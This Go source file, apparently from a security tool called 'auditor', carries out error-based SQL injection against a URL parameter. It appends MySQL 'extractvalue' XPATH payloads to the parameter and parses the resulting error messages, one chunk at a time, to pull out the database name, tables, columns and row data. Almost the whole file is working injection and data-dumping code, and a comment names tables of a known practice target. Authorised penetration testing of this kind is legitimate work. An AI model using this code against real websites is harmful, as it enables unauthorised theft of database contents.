package errorBased

import (
	"auditor/core/utils"
	"auditor/entities"
	"fmt"
	"log"
	"strings"
	"sync"
)

const (
	ErrXPathForm      = "XPATH syntax error: '.*'"
	ErrXPathQueryFrom = "XPATH syntax error: ':.*'"
	ScanLength        = true
	ColonSymbol_16    = "0x3a"
)

func ErrorBasedvalidate(options *entities.DBOptions, query string) string {
	u := *options.URL
	u.RawQuery = fmt.Sprintf("%s=%s", options.Parameter, options.ParameterValue+query)

	return utils.GetPageHTML(u.String(), options.Cookie)
}

func ExtractDBName(options *entities.DBOptions) {
	options.Name += fetchingDataFromHTML(options, "+and+extractvalue(1,concat(':',database()))")
	options.NameLength = len(options.Name)
}

// artists,carts,categ,featured,guestbook,pictures,products,users
func ExtractTables(options *entities.DBOptions) {
	dbLength := fetchingDatabasesLen(options)

	log.Println("init fetching databases!!!")
	var head, tail = 1, 31
	var databases string
	for dbLength > 0 {
		payload := buildDatabasesPayload(head, tail)
		databases += fetchingDataFromHTML(options, payload)
		dbLength -= head + tail
		head, tail = (tail + 1), (tail * 2)
	}

	options.TableCount = len(strings.Split(databases, ","))
	for _, table := range strings.Split(databases, ",") {
		options.Tables[table] = []string{}
	}
}

func ExtractColumns(options *entities.DBOptions) {
	wg := sync.WaitGroup{}

	for table := range options.Tables {
		log.Println("[+] working on table: ", table)

		columnsLen := fetchingColumnsLen(options, table)
		log.Println("[!] found length: ", columnsLen)

		wg.Add(1)
		go func(table string) {
			var head, tail = 1, 31
			var columns string

			for head < columnsLen+32 {
				payload := buildColumnsPayload(table, !ScanLength, head, tail)
				columns += fetchingDataFromHTML(options, payload)
				head, tail = (tail + 1), (tail * 2)
			}

			log.Println("[!!] found columns: ", columns)
			options.Tables[table] = strings.Split(columns, ",")
			wg.Done()
		}(table)
		wg.Wait()
	}
}

func ExtractRowsByTable(options *entities.DBOptions, table string) {
	rowsStrLength := fetchingRowsLen(options, table)
	var head, tail = 1, 31
	var rows string
	for head < rowsStrLength+32 {
		log.Println("[-] current value of rowsStrLength: ", rowsStrLength, head, tail)

		payload := buildRowsPayload(options.PayloadStr, table, !ScanLength, head, tail)
		log.Println("[!!] payload: ", payload)

		rows += fetchingDataFromHTML(options, payload)

		log.Println("====================")
		log.Println(fetchingDataFromHTMLWithouTrim(options, payload))
		log.Println("====================")

		head, tail = (tail + 1), (tail * 2)
	}

	log.Println("[!!] found rows: ", rows)
	dataLength := len(strings.Split(rows, ":"))
	for i := 0; i < dataLength; i += 8 {
		end := i + 8
		if end > dataLength {
			end = dataLength
		}
		options.Rows[i] = strings.Split(rows, ":")[i:end]
	}

	// log.Println()
	// log.Println(len(strings.Split(rows, ":")), strings.Split(rows, ":"))
	// log.Println()
	// options.Rows[len(strings.Split(rows, ":"))] = []string{rows}

}
